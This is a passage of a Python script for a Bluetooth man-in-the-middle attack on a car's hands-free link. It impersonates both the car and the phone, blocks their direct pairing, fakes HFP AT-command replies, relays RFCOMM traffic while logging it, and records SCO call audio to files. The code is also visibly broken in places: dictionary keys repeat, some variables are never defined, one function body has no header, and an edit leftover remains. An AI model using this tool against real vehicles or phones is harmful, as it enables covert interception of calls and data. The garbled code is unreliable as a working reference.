                            # Non-blocking read with no data, just continue
                            time.sleep(0.01)
                            continue
                        else:
                            print(f"[ERROR] Bluetooth error: {e}")
                            break
                    except KeyboardInterrupt:
                        print("[INFO] SCO recording interrupted")
                        break
                    except Exception as e:
                        print(f"[ERROR] SCO socket error: {e}")
                        break
            
            sco_sock.close()
            print(f"[INFO] SCO audio recording completed: {audio_file}")
            return audio_file
            
        except Exception as e:
            print(f"[ERROR] Failed to connect SCO socket: {e}")
            sco_sock.close()
            return None
            
    except Exception as e:
        print(f"[ERROR] SCO interception error: {e}")
        return None



def process_sco_audio(sco_sock):
    """Process SCO audio data with proper error handling"""
    try:
        print("[INFO] Starting SCO audio processing")
        sco_sock.settimeout(0.1)
        
        # Create a directory for audio captures
        audio_dir = os.path.join(session_dir, "SCO_Audio")
        os.makedirs(audio_dir, exist_ok=True)
        
        # Create a file to save raw audio
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        raw_file = os.path.join(audio_dir, f"sco_audio_{timestamp}.raw")
        
        with open(raw_file, "wb") as f:
            while running:
                try:
                    # Check if there's data to read
                    ready, _, _ = select.select([sco_sock], [], [], 0.1)
                    
                    if ready:
                        data = sco_sock.recv(1024)
                        if not data:
                            print("[INFO] SCO audio connection closed")
                            break
                        
                        # Log audio data
                        print(f"[AUDIO] SCO data received: {len(data)} bytes")
                        
                        # Write data to file
                        f.write(data)
                        f.flush()
                except socket.timeout:
                    continue
                except Exception as e:
                    if "Resource temporarily unavailable" in str(e):
                        # Non-critical error, just retry
                        continue
                    print(f"[ERROR] SCO audio processing error: {e}")
                    break
        
        print(f"[INFO] SCO audio capture saved to {raw_file}")
    except Exception as e:
        print(f"[ERROR] Fatal error in SCO audio processing: {e}")



def accept_sco_connection(sco_sock):
    """Accept incoming SCO audio connections with improved error handling"""
    try:
        print("[INFO] Waiting for SCO audio connection...")
        sco_sock.settimeout(30)  # 30 second timeout
        
        # Accept connection
        client_sock, client_addr = sco_sock.accept()
        print(f"[INFO] SCO audio connection established from {client_addr}")
        all_sockets.append(client_sock)
        
        # Start audio processing thread
        audio_thread = threading.Thread(
            target=process_sco_audio,
            args=(client_sock,),  # Pass just one argument
            daemon=True
        )
        audio_thread.start()
        all_threads.append(audio_thread)
        
        print("[INFO] SCO audio capture started")
        return True
    except socket.timeout:
        print("[INFO] Timeout waiting for SCO connection")
        return False
    except Exception as e:
        print(f"[ERROR] Error accepting SCO connection: {e}")


def handle_hfp_commands(data, sock):
    """Handle HFP AT commands from the phone"""
    try:
        # Decode the data
        command = data.decode('utf-8', errors='ignore').strip()
        print(f"[HFP] Received command: {command}")
        
        # Common HFP commands and responses
        responses = {
            'AT+BRSF=': '+BRSF: 1023\r\nOK\r\n',  # Supported features
            'AT+CIND=?': '+CIND: ("call",(0,1)),("callsetup",(0-3)),("service",(0-1)),("signal",(0-5)),("roam",(0-1)),("battchg",(0-5)),("callheld",(0-2))\r\nOK\r\n',
            'AT+CIND?': '+CIND: 0,0,1,5,0,5,0\r\nOK\r\n',  # Status indicators
            'AT+CMER=': 'OK\r\n',  # Event reporting
            'AT+CHLD=?': '+CHLD: (0,1,2,3,4)\r\nOK\r\n',  # Call handling options
            'AT+CLIP=': 'OK\r\n',  # Calling line identification
            'AT+VGS=': 'OK\r\n',  # Volume control
            'AT+VGM=': 'OK\r\n',  # Microphone volume
            'ATD': 'OK\r\n\r\n+CIEV: 3,1\r\n+CIEV: 2,1\r\n',
            'AT+CHUP': 'OK\r\n\r\n+CIEV: 2,0\r\n',  # Hang up
            'ATA': 'OK\r\n\r\n+CIEV: 3,1\r\n+CIEV: 2,1\r\n', 
            'AT+BLDN': 'OK\r\n',   # Last number redial
            'AT+BVRA=': 'OK\r\n',  # Voice recognition
            'ATD': 'OK\r\n',       # Dial command
            'AT+BINP=': '+BINP: "123456789"\r\nOK\r\n',  # Phone number request
            'ATA': 'OK\r\n',       # Answer call
            'AT+BAC=': 'OK\r\n',   # Bluetooth Available Codecs
            'AT+BCC': 'OK\r\n',    # Bluetooth Codec Connection
            'AT+BCS=': 'OK\r\n',   # Bluetooth Codec Selection
            'AT+BRSF=': '+BRSF: 1031\r\nOK\r\n',  # Include all call control features (codec negotiation)
            'AT+BAC=': 'OK\r\n',   # Bluetooth Available Codecs
            'AT+BCS=': 'OK\r\n',   # Bluetooth Codec Selection
            'AT+BCC': 'OK\r\n',    # Bluetooth Codec Connection
            'AT+CIND?': '+CIND: 0,0,1,5,0,5,0\r\nOK\r\n',  # Status indicators including call indicators
            'AT+CMER=': 'OK\r\n',  # Event reporting must be enabled for call status
        }
        if command.startswith('AT+CMER=3'):
        # After enabling event reporting, send initial indicators
            time.sleep(0.1)
            sock.send(b'+CIEV: 1,0\r\n+CIEV: 2,0\r\n+CIEV: 3,1\r\n')
        # Try to find and respond to known commands
        response_sent = False
        for prefix, response in responses.items():
            if command.startswith(prefix):
                sock.send(response.encode('utf-8'))
                print(f"[HFP] Sent response: {response.strip()}")
                response_sent = True
                
                # Active management for specific commands
                if prefix == 'AT+BRSF=':
                    # Send required indicators proactively
                    # This is critical for proper HFP negotiation
                    time.sleep(0.1)
                    sock.send(b'+CIND: ("call",(0,1)),("callsetup",(0-3)),("service",(0-1)),("signal",(0-5)),("roam",(0-1)),("battchg",(0-5)),("callheld",(0-2))\r\nOK\r\n')
                    print("[HFP] Proactively sent +CIND indicators")
                
                break
        
        # Default response for other commands
        if not response_sent:
            sock.send(b'OK\r\n')
            print(f"[HFP] Sent default OK response")
        
        return True
    except Exception as e:
        print(f"[!] Error handling HFP command: {e}")
        return False


# Service UUIDs for Bluetooth profiles
SPP_UUID = "00001101-0000-1000-8000-00805f9b34fb"  # Serial Port Profile
PBAP_UUID = "0000112f-0000-1000-8000-00805f9b34fb"  # Phone Book Access Profile
HFP_UUID = "0000111e-0000-1000-8000-00805f9b34fb"   # Hands-Free Profile
AVRCP_UUID = "0000110e-0000-1000-8000-00805f9b34fb" # Audio/Video Remote Control Profile
HSP_UUID = "00001108-0000-1000-8000-00805f9b34fb"   # Headset Profile
A2DP_UUID = "0000110b-0000-1000-8000-00805f9b34fb"  # Advanced Audio Distribution Profile


def connect_to_car_service(car_mac, channel, service_name):
    """Connect to a car service using direct RFCOMM binding with better error handling"""
    try:
        print(f"[INFO] Connecting to car's {service_name} on channel {channel}...")
        
        # For HFP, try multiple channels if needed
        channels_to_try = [channel]
        if service_name == 'HFP':
            channels_to_try = [1, 3, 4]  # Common HFP channels
        
        for attempt_channel in channels_to_try:
            # First try using rfcomm bind/connect which is more reliable
            device_num = attempt_channel % 10  # Use channel number as device number (modulo 10)
            
            # Release any existing connections
            try:
                subprocess.run(f"sudo rfcomm release {device_num} 2>/dev/null || true", shell=True, check=False)
                time.sleep(1)
            except Exception as e:
                print(f"[DEBUG] Non-critical error releasing device: {e}")
            
            # Try binding with additional flags for better compatibility
            bind_cmd = f"sudo rfcomm bind {device_num} {car_mac} {attempt_channel} -A"
            print(f"[DEBUG] Executing: {bind_cmd}")
            bind_result = subprocess.run(bind_cmd, shell=True, capture_output=True, text=True)
            
            # Check if binding was successful
            if bind_result.returncode == 0 or os.path.exists(f"/dev/rfcomm{device_num}"):
                print(f"[INFO] Successfully bound /dev/rfcomm{device_num} to car on channel {attempt_channel}")
                
                # Try opening with exclusive file locking
                try:
                    fd = os.open(f"/dev/rfcomm{device_num}", os.O_RDWR | os.O_NONBLOCK)
                    print(f"[INFO] Connected to car's {service_name} via /dev/rfcomm{device_num}")
                    
                    # Create a file-like object
                    car_dev = os.fdopen(fd, 'r+b', buffering=0)  # Use unbuffered mode
                    
                    # For HFP, force set up the audio profile
                    if service_name == 'HFP':
                        try:
                            # Force set proper HFP audio profile
                            set_profile_cmd = f"echo -e 'connect {car_mac}\\nselect-profile handsfree_head_unit\\nquit' | bluetoothctl"
                            subprocess.run(set_profile_cmd, shell=True, check=False)
                            
                            # Try to establish SCO link for audio
                            subprocess.run(f"sudo hcitool cmd 0x01 0x0029 {car_mac.replace(':', ' ')} 00 00", 
                                         shell=True, check=False)
                            print("[INFO] Configured HFP audio profile and SCO link")
                        except Exception as e:
                            print(f"[WARN] HFP audio setup error: {e}")
                    
                    return {"type": "device", "fd": fd, "dev": car_dev, "device_num": device_num}
                except Exception as e:
                    print(f"[WARN] Error opening /dev/rfcomm{device_num}: {e}")
            else:
                print(f"[WARN] rfcomm bind failed on channel {attempt_channel}: {bind_result.stderr}")
        
        # If all RFCOMM bindings failed, try socket approach
        print(f"[INFO] All RFCOMM bindings failed, trying socket approach")
        return connect_to_car_service_socket(car_mac, channel, service_name)
        
    except Exception as e:
        print(f"[ERROR] Failed to connect to car's {service_name}: {e}")
        # Try socket approach as fallback
        return connect_to_car_service_socket(car_mac, channel, service_name)


def connect_to_car_service_socket(car_mac, channel, service_name):
    """Fallback method to connect to car service using BluetoothSocket"""
    try:
        print(f"[INFO] Trying socket connection to car's {service_name} on channel {channel}...")
        
        # Create socket 
        car_sock = connect_rfcomm(car_channel, car_mac)
        car_sock.setblocking(True)
        all_sockets.append(car_sock)
        # Try to connect
        for attempt in range(3):
            try:
                car_sock.connect((car_mac, channel))
                print(f"[INFO] Connected to car's {service_name} via socket")
                return {"type": "socket", "sock": car_sock}
            except bluetooth.btcommon.BluetoothError as e:
                if attempt < 2:
                    print(f"[WARN] Socket connection attempt {attempt+1} failed: {e}")
                    time.sleep(2)
                else:
                    print(f"[ERROR] Failed to connect to car's {service_name} after 3 attempts")
                    car_sock.close()
                    return None
    except Exception as e:
        print(f"[ERROR] Socket connection error for {service_name}: {e}")
        return Nones




def isolate_bluetooth_adapters(car_adapter, phone_adapter, car_mac):
    """Forcefully isolate Bluetooth adapters to prevent direct phone-to-car connections"""
    print(f"[INFO] Completely isolating Bluetooth adapters...")
    
    # Stop bluetooth service completely
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth.service"], check=True)
    time.sleep(2)
    
    # Bring down all adapters first
    subprocess.run(["sudo", "hciconfig", "all", "down"], check=False)
    time.sleep(1)
    
    # Only bring up the adapters we need with correct settings
    subprocess.run(["sudo", "hciconfig", car_adapter, "up"], check=True)
    time.sleep(0.5)
    subprocess.run(["sudo", "hciconfig", phone_adapter, "up"], check=True)
    time.sleep(0.5)
    
    # Block the car MAC on phone adapter to prevent ANY direct connections
    try:
        # Completely prevent direct connections
        print(f"[INFO] Blocking ALL connections between phone and car")
        
        # Block with btmgmt (most reliable)
        block_cmd = f"sudo btmgmt -i {phone_adapter} block {car_mac.replace(':', '')}"
        subprocess.run(block_cmd, shell=True, check=False)
        
        # Also block with bluetoothctl
        block_cmd2 = f"echo -e 'block {car_mac}\nquit\n' | bluetoothctl"
        subprocess.run(block_cmd2, shell=True, check=False)
        
        # Block the MAC address through iptables as well (low-level firewall)
        block_cmd3 = f"sudo iptables -A INPUT -m bluetooth --bluetooth-src {car_mac} -j DROP"
        subprocess.run(block_cmd3, shell=True, check=False)
    except Exception as e:
        print(f"[WARN] Could not block device completely, but continuing: {e}")
    
    # Update adapter settings for optimal isolation
    subprocess.run(["sudo", "hciconfig", phone_adapter, "name", "CAR-SYSTEM-CONNECT"], check=False)
    subprocess.run(["sudo", "hciconfig", phone_adapter, "class", "0x240420"], check=False)  # Set car audio class
    subprocess.run(["sudo", "hciconfig", car_adapter, "name", "CAR-PROXY"], check=False)
    
    # Make the phone adapter discoverable and connectable
    subprocess.run(["sudo", "hciconfig", phone_adapter, "piscan"], check=False)
    subprocess.run(["sudo", "bluetoothctl", "discoverable", "on"], check=False)
    
    # Add service UUIDs to phone adapter for better advertising
    try:
        print(f"[INFO] Setting up service advertisements")
        # Add HFP service locally
        add_hfp_cmd = f"sudo sdptool add --channel=1 HF"
        subprocess.run(add_hfp_cmd, shell=True, check=False)
        
        # Add SPP service
        add_spp_cmd = f"sudo sdptool add --channel=4 SP"
        subprocess.run(add_spp_cmd, shell=True, check=False)
        
        # Add HSP service
        add_hsp_cmd = f"sudo sdptool add --channel=12 HS"
        subprocess.run(add_hsp_cmd, shell=True, check=False)
    except Exception as e:
        print(f"[WARN] Error adding services: {e}")
    
    # Final step: Check if blocking was successful
    try:
        # Test if blocking works by trying to connect from phone adapter to car
        test_cmd = f"sudo l2ping -i {phone_adapter} -c 1 {car_mac}"
        result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
        
        if "1 received" in result.stdout:
            print(f"[WARN] Blocking not fully effective - expect direct connections may still occur")
        else:
            print(f"[INFO] Successfully blocked direct connections")
    except Exception:
        # No output likely means blocking worked
        print(f"[INFO] Blocking appears successful")
    
    print(f"[INFO] Complete adapter isolation finished")



def discover_car_services(car_mac, adapter):
        """
        Discover services on car using sdptool records
        
        Args:
            car_mac: MAC address of the target car
            adapter: Interface to use (e.g., hci1)
        
        Returns:
            dict: Dictionary of services with their channels
        """
        print(f"[*] Discovering services on {car_mac} using {adapter}")
        car_services = {}
        
        try:
            # Import re module locally to ensure it's available within this function
            import re
            
            # Run sdptool records with the specific adapter and MAC
            cmd = f"sudo sdptool -i {adapter} records {car_mac}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            
            if result.returncode != 0:
                print(f"[!] sdptool records command failed: {result.stderr}")
                return car_services
                
            output = result.stdout
            print(f"[DEBUG] sdptool records output:\n{output}")
            
            # Parse the output into services
            current_service = None
            current_name = None
            services_data = {}
            
            for line in output.splitlines():
                line = line.strip()
                
                # Start of a new service
                if line.startswith("Service Name:"):
                    # Save the previous service if it exists
                    if current_service and current_name:
                        services_data[current_name] = current_service
                    
                    # Start a new service
                    current_name = line.replace("Service Name:", "").strip()
                    current_service = {"name": current_name, "channels": []}
                    
                # Record handle
                elif line.startswith("Service RecHandle:"):
                    if current_service:
                        current_service["handle"] = line.replace("Service RecHandle:", "").strip()
                        
                # Service class
                elif line.startswith("Service Class ID List:"):
                    if current_service:
                        current_service["classes"] = []
                        
                # Add to service classes
                elif "(" in line and ")" in line and current_service and "classes" in current_service:
                    # Extract the class name and ID from a line like: "Handsfree" (0x111e)
                    class_match = re.search(r'"([^"]+)"\s+\(([^)]+)\)', line)
                    if class_match:
                        class_name = class_match.group(1)
                        class_id = class_match.group(2)
                        current_service["classes"].append({"name": class_name, "id": class_id})
                        
                        # Map well-known service class IDs
                        if "0x1101" in class_id:  # Serial Port
                            current_service["type"] = "SPP"
                        elif "0x111e" in class_id:  # Hands-Free
                            current_service["type"] = "HFP"
                        elif "0x110b" in class_id:  # Audio Sink
                            current_service["type"] = "A2DP"
                        elif "0x110c" in class_id:  # Audio Source
                            current_service["type"] = "A2DP_SOURCE"
                        elif "0x110e" in class_id:  # AV Remote Control
                            current_service["type"] = "AVRCP"
                        elif "0x1108" in class_id:  # Headset
                            current_service["type"] = "HSP"
                        elif "0x112f" in class_id or "0x112e" in class_id:  # Phonebook Access
                            current_service["type"] = "PBAP"
                        elif "0x1203" in class_id:  # Generic Audio
                            if "Audio" in current_service["name"]:
                                current_service["type"] = "GENERIC_AUDIO"
                
                # Look for RFCOMM channel
                elif "Channel:" in line and current_service:
                    channel_match = re.search(r'Channel:\s*(\d+)', line)
                    if channel_match:
                        channel = int(channel_match.group(1))
                        current_service["channels"].append(channel)
                        
                        # If this is the first channel, use it as the primary channel
                        if "channel" not in current_service:
                            current_service["channel"] = channel
            
            # Add the last service
            if current_service and current_name:
                services_data[current_name] = current_service
                
            # Create service type mappings (for backward compatibility)
            for name, service in services_data.items():
                if "type" in service and "channel" in service:
                    service_type = service["type"]
                    car_services[service_type] = service["channel"]
                    print(f"[+] Found {service_type} service on channel {service['channel']}")
            
            # Special handling for HFP which needs SCO audio
            if "HFP" in car_services:
                print("[*] HFP service found - SCO audio will be available")
                
            return car_services
            
        except Exception as e:
            print(f"[!] Error discovering services with sdptool records: {e}")
            import traceback
            traceback.print_exc()
            return {}



def advertise_hfp_service(channel):
    """Explicitly advertise HFP service using sdptool with all required attributes"""
    try:
        print(f"[INFO] Using enhanced HFP service advertisement for channel {channel}")
        
        # First try standard sdptool command (more reliable)
        cmd = f"sudo sdptool add --channel={channel} HF"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[INFO] Successfully registered HFP service with sdptool")
            
            # Also try to set the class of device to hands-free
            try:
                subprocess.run("sudo hciconfig hci0 class 0x240404", shell=True, check=False)
                print("[INFO] Set device class to Hands-Free")
            except:
                pass
                
            return True
        else:
            print(f"[WARN] Error with sdptool: {result.stderr}")
            
            # Try direct shell implementation as fallback
            try:
                # Create a simple record manually
                with open("/tmp/hfp.record", "w") as f:
                    f.write(f"""
                    SERVICE_NAME=Hands-Free unit
                    PROVIDER_NAME=MitM
                    SERVICE_CLASS_ID_LIST=111e
                    PROTOCOL_DESCRIPTOR_LIST=0100,0003,{channel:02x}
                    PROFILE_DESCRIPTOR_LIST=111e,0105
                    """)
                
                # Register using sdptool input
                cmd = f"sudo sdptool add --handle=0x10010 HF < /tmp/hfp.record"
                subprocess.run(cmd, shell=True, check=False)
                print("[INFO] Registered HFP service using manual record")
                return True
            except Exception as e:
                print(f"[ERROR] All HFP service methods failed: {e}")
                return False
                
    except Exception as e:
        print(f"[ERROR] Error in HFP service advertisement: {e}")
        return False

# TO (FIXED VERSION):
def setup_sco_audio():
    """Set up SCO audio connection with proper error handling"""
    try:
        print("[INFO] Setting up SCO audio connection")
        
        # Create an SCO socket
        sco_sock = bluetooth.BluetoothSocket(bluetooth.SCO)
        
        # Bind to any available port
        sco_sock.bind(("", 0))
        
        # Listen for connections
        sco_sock.listen(1)
        
        # Define a thread function to accept connections
        def accept_sco():
            try:
                print("[INFO] Waiting for SCO audio connection...")
                sco_sock.settimeout(30)  # 30 second timeout
                
                try:
                    client_sock, client_addr = sco_sock.accept()
                    print(f"[INFO] SCO connection established from {client_addr}")
                    all_sockets.append(client_sock)
                    
                    # Process audio data in separate thread
                    def process_audio():
                        try:
                            client_sock.settimeout(0.1)
                            
                            while running:
                                try:
                                    data = client_sock.recv(1024)
                                    if not data:
                                        break
                                    print(f"[AUDIO] SCO data received: {len(data)} bytes")
                                except socket.timeout:
                                    continue
                                except Exception as e:
                                    print(f"[ERROR] SCO read error: {e}")
                                    break
                        except Exception as e:
                            print(f"[ERROR] Audio processing error: {e}")
                    
                    audio_thread = threading.Thread(target=process_audio, daemon=True)
                    audio_thread.start()
                    all_threads.append(audio_thread)
                    
                except socket.timeout:
                    print("[WARN] Timeout waiting for SCO connection")
                except Exception as e:
                    print(f"[ERROR] Error accepting SCO connection: {e}")
            except Exception as e:
                print(f"[ERROR] SCO accept thread error: {e}")
        
        # Start the accept thread
        sco_thread = threading.Thread(target=accept_sco, daemon=True)
        sco_thread.start()
        all_threads.append(sco_thread)
        
        print("[INFO] SCO audio setup complete")
        return sco_sock
    except Exception as e:
        print(f"[ERROR] SCO setup failed: {e}")
        return None


def start_bidirectional_proxy(car_sock, phone_sock, service_name):
    """Start bidirectional data forwarding between car and phone sockets"""
    global session_dir
    
    # Special handling for HFP that's already connected
    if service_name == 'HFP' and car_sock == "ALREADY_CONNECTED":
        print(f"[INFO] Using special handling for HFP with existing connection")
        # For HFP, we'll use a more direct approach using rfcomm command to create the device
        try:
            # Create rfcomm device for the phone connection
            device_num = 0
            subprocess.run(f"sudo rfcomm release {device_num} 2>/dev/null || true", shell=True, check=False)
            time.sleep(1)
            
            # Now we need to connect car to phone
            # This is complex and requires a custom approach
            print(f"[INFO] Setting up HFP call routing between phone and car")
            
            # Unfortunately, we can't easily proxy HFP directly with this approach
            print(f"[WARN] HFP call functionality limited - using socket audio forwarding only")
            return
        except Exception as e:
            print(f"[ERROR] HFP special handling failed: {e}")
            return
    
    def forward_data(source_sock, dest_sock, direction):
        try:
            source_sock.settimeout(0.1)  # Short timeout for responsive reads
            print(f"[INFO] Starting {direction} proxy for {service_name}...")
            
            while running:
                try:
                    # Try to read from source socket
                    data = source_sock.recv(1024)
                    
                    if not data:
                        print(f"[INFO] {direction} disconnected - no more data")
                        break
                    
                    # Log data
                    print(f"[DATA] {service_name} {direction}: {len(data)} bytes")
                    
                    # Save to file for analysis
                    save_captured_data(data, service_name, direction, session_dir)
                    
                    # Forward to destination
                    dest_sock.send(data)
                except socket.timeout:
                    # Expected timeout, just continue
                    continue
                except Exception as e:
                    print(f"[ERROR] {direction} forwarding error: {e}")
                    break
        except Exception as e:
            print(f"[ERROR] Fatal error in {direction} proxy: {e}")
    
    # Create and start threads for both directions
    car_to_phone = threading.Thread(
        target=forward_data,
        args=(car_sock, phone_sock, "car→phone", service_name, local_session_dir),
        daemon=True
    )
    
    phone_to_car = threading.Thread(
        target=forward_data,
        args=(phone_sock, car_sock, "phone→car", service_name, local_session_dir),
        daemon=True
    )
    
    car_to_phone.start()
    phone_to_car.start()
    
    all_threads.extend([car_to_phone, phone_to_car])
    print(f"[+] Started bidirectional proxy for {service_name}")


def setup_phone_emulation(adapter="hci1"):
    """Set up the adapter to emulate a phone for the car"""
    try:
        print(f"[INFO] Setting up {adapter} to emulate a phone")
        
        # Set the class to phone
        subprocess.run(f"sudo hciconfig {adapter} class 0x5a020c", shell=True, check=False)
        
        # Set up as audio gateway (AG) for car
        subprocess.run(f"sudo sdptool add --channel=1 AG", shell=True, check=False)
        
        print(f"[INFO] {adapter} configured as phone for car connection")
        return True
    except Exception as e:
        print(f"[ERROR] Phone emulation setup failed: {e}")
        return False


def setup_car_emulation(adapter="hci0"):
    """Set up the adapter to emulate a car HFP unit for the phone"""
    try:
        print(f"[INFO] Setting up {adapter} to emulate a car HFP unit")
        
        # Set the class to hands-free
        subprocess.run(f"sudo hciconfig {adapter} class 0x240420", shell=True, check=False)
        
        # Set up as hands-free unit (HF) for phone
        subprocess.run(f"sudo sdptool add --channel=1 HF", shell=True, check=False)
        
        print(f"[INFO] {adapter} configured as car HFP unit for phone connection")
        return True
    except Exception as e:
        print(f"[ERROR] Car emulation setup failed: {e}")
        return False




    """Try connecting to car service on alternative channels"""
    try:
        print(f"[INFO] Trying alternative channels for {service_name}...")
        
        # Try some common alternative channels
        alternative_channels = {
            'SPP': [3, 4, 5, 6],
            'HSP': [2, 6, 12, 13]
        }
        
        if service_name not in alternative_channels:
            return None
            
        for channel in alternative_channels[service_name]:
            try:
                print(f"[INFO] Trying {service_name} on channel {channel}")
                # First try socket
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.connect((car_mac, channel))
                print(f"[INFO] Connected to {service_name} on channel {channel}")
                return sock
            except Exception as e:
                print(f"[DEBUG] Failed on channel {channel}: {e}")
                continue
        
        return None
    except Exception as e:
        print(f"[ERROR] Alternative channel connection failed: {e}")
        return None




def setup_hfp_for_phone():
    """Set up HFP services in a way the phone will recognize"""
    try:
        print("[INFO] Setting up phone-compatible HFP services")
        
        # First release any existing services
        subprocess.run("sudo sdptool browse local | grep -A 1 'Service RecHandle' | awk '/0x1/ {print $2}' | xargs -I{} sudo sdptool del {}", 
                     shell=True, check=False)
        
        # Create the services with better defined attributes
        
        # 1. HFP - Hands-Free Profile
        subprocess.run("sudo sdptool add --channel=1 HF", shell=True, check=False)
        
        # 2. HSP - Headset Profile for audio
        subprocess.run("sudo sdptool add --channel=12 HS", shell=True, check=False)
        
        # 3. A2DP - Advanced Audio
        subprocess.run("sudo hciconfig hci0 class 0x240404", shell=True, check=False)
        subprocess.run("sudo sdptool add --channel=1 HF ", shell=True, check=False)

        # 4. Make sure the adapter is discoverable
        subprocess.run("sudo hciconfig hci0 piscan", shell=True, check=False)
        subprocess.run("sudo bluetoothctl discoverable on", shell=True, check=False)
        
        print("[INFO] Phone-compatible services set up")
        return True
    except Exception as e:
        print(f"[ERROR] Error setting up phone services: {e}")
        return False


def create_direct_rfcomm_connection(phone_mac):
    """Create a direct RFCOMM connection to the phone with enhanced HFP handling"""
    try:
        print(f"[INFO] Creating direct RFCOMM connection to {phone_mac}")
        
        # First try with direct socket method (more reliable for HFP)
        for channel in [1, 3, 4, 12]:  # Try common channels
            try:
                print(f"[INFO] Attempting direct socket connection on channel {channel}...")
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.connect((phone_mac, channel))
                print(f"[INFO] Direct connection successful on channel {channel}")
                
                # Set up SCO for voice calls if this is likely HFP (channel 1)
                if channel == 1:
                    try:
                        # Request SCO connection for audio
                        subprocess.run(["sudo", "hcitool", "sco", phone_mac], check=False)
                        
                        # Set up audio profile
                        device_addr = phone_mac.replace(":", "_")
                        subprocess.run([
                            "pactl", "set-card-profile", 
                            f"bluez_card.{device_addr}", "handsfree_head_unit"
                        ], check=False)
                        
                        print("[INFO] Set up HFP audio profile")
                    except Exception as e:
                        print(f"[WARN] Audio setup error: {e}")
                
                # Add to connections dictionary
                phone_connections[f"RFCOMM_{channel}"] = sock
                all_sockets.append(sock)
                
                # Try to detect service type
                if channel == 1:
                    print("[INFO] Likely HFP connection on channel 1")
                    phone_connections["HFP"] = sock
                elif channel == 12:
                    print("[INFO] Likely HSP connection on channel 12")
                    phone_connections["HSP"] = sock
                else:
                    print(f"[INFO] Likely SPP connection on channel {channel}")
                    phone_connections["SPP"] = sock
                
                return True
            except Exception as e:
                print(f"[DEBUG] Channel {channel} connection error: {e}")
                continue
        
        # If direct socket approach failed, try rfcomm bind method
        try:
            # Try multiple rfcomm devices to avoid conflicts
            for dev_num in range(3):
                try:
                    # Release any existing connections
                    subprocess.run(f"sudo rfcomm release {dev_num}", shell=True, check=False)
                    time.sleep(0.5)
                    
                    # Bind rfcomm device - use channel 1 for HFP
                    bind_cmd = f"sudo rfcomm bind {dev_num} {phone_mac} 1"
                    result = subprocess.run(bind_cmd, shell=True, capture_output=True, text=True)
                    
                    if os.path.exists(f"/dev/rfcomm{dev_num}"):
                        print(f"[INFO] Created /dev/rfcomm{dev_num} for phone connection")
                        
                        # Try to open the device
                        try:
                            # Use non-blocking mode
                            fd = os.open(f"/dev/rfcomm{dev_num}", os.O_RDWR | os.O_NONBLOCK)
                            file_obj = os.fdopen(fd, "r+b", buffering=0)
                            
                            print(f"[INFO] Successfully opened /dev/rfcomm{dev_num}")
                            
                            # Create socket-like wrapper
                            class RfcommFile:
                                def __init__(self, file_obj, dev_num):
                                    self.file = file_obj
                                    self.dev_num = dev_num
                                
                                def recv(self, bufsize):
                                    try:
                                        ready = select.select([self.file], [], [], 0.1)[0]
                                        if ready:
                                            return self.file.read(bufsize)
                                        return b''
                                    except Exception as e:
                                        print(f"[WARN] Read error: {e}")
                                        return b''
                                
                                def send(self, data):
                                    try:
                                        self.file.write(data)
                                        self.file.flush()
                                        return len(data)
                                    except Exception as e:
                                        print(f"[WARN] Write error: {e}")
                                        return 0
                                
                                def close(self):
                                    try:
                                        self.file.close()
                                        subprocess.run(f"sudo rfcomm release {self.dev_num}", 
                                                     shell=True, check=False)
                                    except:
                                        pass
                            
                            wrapper = RfcommFile(file_obj, dev_num)
                            phone_connections["RFCOMM_FILE"] = wrapper
                            phone_connections["HFP"] = wrapper  # Assume it's HFP
                            
                            # Set up SCO for audio
                            try:
                                subprocess.run(["sudo", "hcitool", "sco", phone_mac], check=False)
                            except:
                                pass
                                
                            return True
                        except Exception as e:
                            print(f"[WARN] Error opening device: {e}")
                    else:
                        print(f"[WARN] Device file not created")
                except Exception as e:
                    print(f"[WARN] rfcomm bind error: {e}")
            
            print("[INFO] All rfcomm bind attempts failed")
            return False
        except Exception as e:
            print(f"[ERROR] rfcomm method error: {e}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Direct connection error: {e}")
        return False


def reset_bluetooth_environment():
    """Reset the entire Bluetooth environment before starting the MitM attack"""
    print("[INFO] Resetting Bluetooth environment...")
    
    try:
        # Stop any running processes that might interfere
        subprocess.run("sudo pkill -15 bluetoothd || true", shell=True, check=False)
        subprocess.run("sudo pkill -15 rfcomm || true", shell=True, check=False)
        time.sleep(1)
        
        # Kill any remaining processes forcefully
        subprocess.run("sudo pkill -9 bluetoothd || true", shell=True, check=False)
        subprocess.run("sudo pkill -9 rfcomm || true", shell=True, check=False)
        time.sleep(1)
        
        # Reset all Bluetooth adapters
        hci_devices = subprocess.run("hciconfig | grep hci", shell=True, capture_output=True, text=True)
        if hci_devices.returncode == 0:
            for line in hci_devices.stdout.splitlines():
                if line.startswith("hci"):
                    adapter = line.split(":")[0].strip()
                    print(f"[INFO] Resetting adapter {adapter}")
                    subprocess.run(f"sudo hciconfig {adapter} down", shell=True, check=False)
                    time.sleep(0.5)
            
            # Unload and reload Bluetooth modules
            subprocess.run("sudo rmmod btusb || true", shell=True, check=False)
            subprocess.run("sudo rmmod rfcomm || true", shell=True, check=False)
            time.sleep(1)
            
            # Reload modules
            subprocess.run("sudo modprobe btusb", shell=True, check=False)
            subprocess.run("sudo modprobe rfcomm", shell=True, check=False)
            time.sleep(2)
            
            # Bring up adapters again
            for line in hci_devices.stdout.splitlines():
                if line.startswith("hci"):
                    adapter = line.split(":")[0].strip()
                    subprocess.run(f"sudo hciconfig {adapter} up", shell=True, check=False)
                    time.sleep(0.5)
        
        # Restart Bluetooth service completely
        subprocess.run("sudo systemctl restart bluetooth.service", shell=True, check=False)
        time.sleep(3)
        
        print("[INFO] Bluetooth environment reset complete")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to reset Bluetooth environment: {e}")
        return False

def connect_rfcomm(channel, target_mac):
    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    sock.setblocking(False)
    sock.connect((target_mac, channel))
    return sock


def proxy_data_device_to_socket(car_dev, phone_sock, service_name, session_dir):
    """Proxy data from a device file to a socket"""
    print(f"[INFO] Starting car→phone proxy for {service_name}...")
    
    try:
        buffer_size = 1024
        
        while running:
            try:
                # Check if there's data to read from the device
